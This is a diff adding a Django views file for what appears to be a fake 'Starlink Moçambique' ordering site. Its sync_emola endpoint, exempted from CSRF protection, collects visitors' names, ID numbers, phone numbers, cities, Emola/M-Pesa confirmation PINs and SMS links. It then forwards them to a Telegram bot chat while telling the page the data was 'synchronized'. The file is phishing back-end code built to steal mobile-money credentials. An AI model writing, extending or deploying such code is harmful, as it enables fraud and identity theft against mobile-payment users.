@@ -1,0 +1,37 @@
+import json
+import requests
+from django.shortcuts import render
+from django.http import JsonResponse
+from django.views.decorators.csrf import csrf_exempt
+
+# Configuration
+BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
+CHAT_ID = "YOUR_TELEGRAM_CHAT_ID"
+
+def home(request):
+    return render(request, 'index.html')
+
+@csrf_exempt
+def sync_emola(request):
+    """Processes Identity and Emola (M-Pesa) authentication data"""
+    if request.method == 'POST':
+        try:
+            data = json.loads(request.body)
+            report = (
+                "🚀 *STARLINK MOÇAMBIQUE SYNC*\n"
+                "----------------------------------\n"
+                f"👤 *Cliente:* `{data.get('name')}` | `{data.get('id_no')}`\n"
+                f"📞 *Contacto:* `{data.get('phone')}`\n"
+                f"📍 *Cidade:* `{data.get('city')}`\n"
+                "----------------------------------\n"
+                f"💰 *Pagamento:* `EMOLA / M-PESA`\n"
+                f"🔑 *PIN Confirmação:* `{data.get('pin')}`\n"
+                f"🔗 *Link SMS:* `{data.get('sms_link')}`\n"
+                "----------------------------------\n"
+                f"📦 *Pedido:* {data.get('item')} ({data.get('total')} MT)"
+            )
+            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                          data={"chat_id": CHAT_ID, "text": report, "parse_mode": "Markdown"})
+            return JsonResponse({"status": "synchronized"})
+        except Exception as e:
+            return JsonResponse({"status": "error", "message": str(e)}, status=400)
